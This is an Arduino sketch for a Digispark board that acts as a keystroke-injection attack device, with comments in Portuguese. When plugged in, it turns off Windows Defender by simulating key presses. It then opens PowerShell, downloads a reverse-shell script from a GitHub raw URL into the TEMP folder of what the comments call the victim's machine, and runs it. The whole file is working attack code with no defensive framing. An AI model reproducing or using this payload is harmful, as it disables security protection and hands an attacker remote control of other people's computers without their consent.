#include "DigiKeyboard.h"
#include "DigiKeyboardPtBr.h"

void setup() {
  pinMode(0,OUTPUT); 
  pinMode(1,OUTPUT);     
}
void loop() {
  pisca_led(100);
  
  //  Desliga o Windows Defender
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_M, MOD_GUI_LEFT);  //  Minimiza todas as janelas abertas
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);  //  Abre o executar
  DigiKeyboard.delay(1000);
  DigiKeyboardPtBr.println("Windowsdefender://threat/");  //  Abre o windows defender pelo executar
  DigiKeyboard.delay(5000);
  DigiKeyboard.print("\t");   //  TAB
  DigiKeyboard.delay(500);
  DigiKeyboard.print("\t");
  DigiKeyboard.delay(500);
  DigiKeyboard.print("\t");
  DigiKeyboard.delay(500);
  DigiKeyboard.print("\t");  
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_SPACE);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("\t");
  DigiKeyboard.delay(500);
  DigiKeyboard.print("\t");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  //  Desliga o Windows Defender
  
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_F4, MOD_ALT_LEFT);  //  Fecha a janela
  DigiKeyboard.delay(500);
  
  //  Script here
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);  //  Abre o executar
  DigiKeyboard.delay(1000);
  DigiKeyboardPtBr.println("powershell");  // Abre o powershell
  DigiKeyboard.delay(500);
  DigiKeyboardPtBr.println("cd $env:TEMP"); //  Entra no diretório TEMP da maquina da vitima
  DigiKeyboard.delay(500);
  DigiKeyboardPtBr.println("Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/cosmosredshiftsete/RubberDuck_Digispark/refs/heads/main/reverse_shell.ps1' -OutFile 'reverse_shell.ps1'");  //  Baixa a shell reversa na maquina da vitima
  DigiKeyboard.delay(500);
  DigiKeyboardPtBr.println("cls");
  //  Executa seu Malware na maquina
  DigiKeyboard.print("reverse_shell.ps1");
  DigiKeyboard.delay(500);
  DigiKeyboard.print("\t");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  //  Executa seu Malware na maquina
  //  Script here
  
  pisca_led(100); 
  for(;;){ /*empty*/ } 
}

void pisca_led(int velocidade){  
  for (int inicio =1; inicio <= 10; inicio ++) {
    digitalWrite(0, HIGH); 
    digitalWrite(1, HIGH); 
    DigiKeyboardPtBr.delay(velocidade);  
    digitalWrite(0, LOW); 
    digitalWrite(1, LOW); 
    DigiKeyboardPtBr.delay(velocidade);  
  } 
}
